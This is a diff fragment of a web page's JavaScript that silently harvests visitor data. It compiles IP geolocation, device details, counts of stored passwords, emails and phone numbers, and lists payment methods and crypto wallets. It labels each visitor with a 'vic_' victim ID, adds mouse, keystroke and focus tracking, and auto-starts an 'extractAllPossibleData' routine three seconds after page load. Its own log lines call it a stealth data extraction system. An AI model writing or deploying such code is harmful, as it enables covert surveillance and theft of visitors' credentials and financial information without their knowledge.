+                ip: data.network.ip.ip || 'Unknown',
+                location: `${data.geolocation.ipLocation.city || 'Unknown'}, ${data.geolocation.ipLocation.country || 'Unknown'}`,
+                isp: data.geolocation.ipLocation.org || 'Unknown',
+                connection: data.network.network.effectiveType,
+                storage: {
+                    localStorage: Object.keys(data.hardware.storage.localStorage).length,
+                    cookies: Object.keys(data.hardware.storage.cookies).length,
+                    sessionStorage: Object.keys(data.hardware.storage.sessionStorage).length
+                },
+                peripherals: {
+                    touch: data.hardware.peripherals.touchSupport,
+                    bluetooth: data.hardware.peripherals.bluetooth,
+                    usb: data.hardware.peripherals.usb,
+                    battery: data.hardware.battery.available ? (data.hardware.battery.level * 100) + '%' : 'N/A'
+                },
+                performance: {
+                    heapUsed: data.hardware.memory.usedJSHeapSize ? Math.round(data.hardware.memory.usedJSHeapSize / 1024 / 1024) + 'MB' : 'Unavailable',
+                    heapLimit: data.hardware.memory.jsHeapSizeLimit ? Math.round(data.hardware.memory.jsHeapSizeLimit / 1024 / 1024) + 'MB' : 'Unavailable'
+                },
+                plugins: data.system.plugins.slice(0, 5).map(p => p.name),
+                userData: {
+                    forms: Object.keys(data.user.forms).length,
+                    inputs: Object.keys(data.user.inputs).length,
+                    passwords: Object.keys(data.user.passwords).length,
+                    socialMedia: Object.keys(data.user.socialMedia),
+                    emails: data.social.emailAddresses.length,
+                    phones: data.social.phoneNumbers.length,
+                    socialHandles: Object.keys(data.social.socialProfiles).length,
+                    paymentMethods: Object.keys(data.financial.paymentMethods).join(', ') || 'None',
+                    cryptoWallets: Object.keys(data.financial.cryptoWallets).join(', ') || 'None'
+                },
+                behavioral: {
+                    timeOnPage: Math.round(data.behavioral.timeOnPage/1000) + 's',
+                    scrollDepth: data.behavioral.scrollDepth + '%',
+                    mouseMovements: data.behavioral.mouseMovements.length,
+                    clicks: data.behavioral.clicks,
+                    keystrokes: data.behavioral.keystrokes
+                },
+                capabilities: {
+                    webRTC: data.advanced.webRTC.webRTCAvailable,
+                    notifications: data.advanced.notifications.permission,
+                    camera: data.advanced.permissions.camera || 'unknown',
+                    microphone: data.advanced.permissions.microphone || 'unknown',
+                    serviceWorkers: data.advanced.serviceWorkers.serviceWorkers,
+                    mediaDevices: data.advanced.mediaDevices.devices?.length || 0,
+                    webdriver: data.browser.webdriver ? 'Detected' : 'Not detected',
+                    doNotTrack: data.system.doNotTrack || 'Not set'
+                }
+            };
         }
 
         function generateVictimId() {
             return 'vic_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now().toString(36);
         }
 
-        // Minimal behavioral tracking
+        // BEHAVIORAL TRACKING
         window.pageLoadTime = Date.now();
+        window.mouseMovements = [];
         window.clickCount = 0;
+        window.keystrokeCount = 0;
+        window.focusChanges = 0;
+        window.resizeEvents = 0;
+
+        document.addEventListener('mousemove', (e) => {
+            window.mouseMovements.push({
+                x: e.clientX,
+                y: e.clientY,
+                timestamp: Date.now()
+            });
+            if (window.mouseMovements.length > 1000) {
+                window.mouseMovements.shift();
+            }
+        });
 
         document.addEventListener('click', () => {
             window.clickCount++;
         });
 
-        console.log('🕵️ STEALTH DATA COLLECTION SYSTEM LOADED');
+        document.addEventListener('keydown', () => {
+            window.keystrokeCount++;
+        });
+
+        document.addEventListener('focus', () => {
+            window.focusChanges++;
+        });
+
+        window.addEventListener('resize', () => {
+            window.resizeEvents++;
+        });
+
+        // AUTO-START DATA COLLECTION IN BACKGROUND
+        setTimeout(() => {
+            extractAllPossibleData().then(data => {
+                console.log('🕵️ Background data collection complete', data);
+            });
+        }, 3000);
+
+        console.log('🕵️ COMPREHENSIVE DATA EXTRACTION SYSTEM LOADED');
     </script>
 </body>
 </html>
